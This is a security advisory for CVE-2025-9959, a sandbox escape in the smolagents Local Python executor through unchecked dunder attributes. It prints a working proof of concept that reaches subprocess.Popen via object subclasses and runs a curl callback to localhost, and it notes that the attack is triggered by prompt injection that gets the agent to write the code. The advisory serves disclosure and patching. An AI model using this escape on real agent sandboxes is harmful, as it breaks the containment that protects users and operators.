{"hash":"468ff74b60d44f76af796c4a4146a5a5b52958a7","data":{"post":{"title":"Smolagents Local Python Sandbox Escape","path":"/vulnerabilities/smolagents-local-python-sandbox-escape-jfsa-2025-001434277/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>Sandbox escape in smolagents Local Python execution environment via dunder attributes</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>smolagents</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,1.21.0)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>Incomplete validation of dunder attributes allows an attacker to escape from the Local Python execution environment sandbox, enforced by smolagents. The attack requires a Prompt Injection in order to trick the agent to create malicious code.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<pre><code class=\"language-python\">from smolagents.local_python_executor import LocalPythonExecutor\ncustom_executor = LocalPythonExecutor([])\ncustom_executor.send_tools({})\n\ndef run_capture_exception(command: str):\n    try:\n        custom_executor(harmful_command)\n        print(\"passed: \" + harmful_command)\n        return 1\n    except Exception as e:\n        print(\"ERROR:\\n\", e)\n        return 0\n  \nEVIL_PROMPT=\"\"\"\n#create a dummy function - will pass all check as it does nothing\ndef just_a_func():\npass\n#this will yield &#x3C;class 'function'>\nfunction_class = just_a_func.__getattribute__('__class__')\n#this will yield (&#x3C;class 'object'>,)\nbases_attribute = type.__getattribute__(function_class, '__bases__')\n#this script if for locating the \"subprocess.Popen\" class among the\nclass list - for each runtime it could be different\nnum = 0\nfor i in bases_attribute[0].__subclasses__():\n#found the \"subprocess.Popen\" class - use and run it\nif 'subprocess.Popen' in str(i):\nrunpopen = bases_attribute[0].__subclasses__()[num](['curl',\n'http://localhost:1337/pwned'])\n\nstdout, stderr = runpopen.communicate()\nnum += 1\n\"\"\"\n\nrun_capture_exception(EVIL_PROMPT)\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>When creating a smolagents <code>CodeAgent</code>, do not use the Local Python execution environment. For example, the <code>wasm</code> executor can be used -</p>\n<pre><code>agent = CodeAgent(tools=[], model=model, add_base_tools=False,\nadditional_authorized_imports=[],executor_type='wasm')\n</code></pre>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/huggingface/smolagents/pull/1551\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Fix commit</a></p>\n","description":"CVE-2025-9959, HIGH, Sandbox escape in smolagents Local Python execution environment via dunder attributes","date_published":"2025-09-03","xray_id":"JFSA-2025-001434277","vul_id":"CVE-2025-9959","severity":"high","discovered_by":"Natan Nehorai","last_updated":"2025-09-03","cvss":7.6}},"context":{}}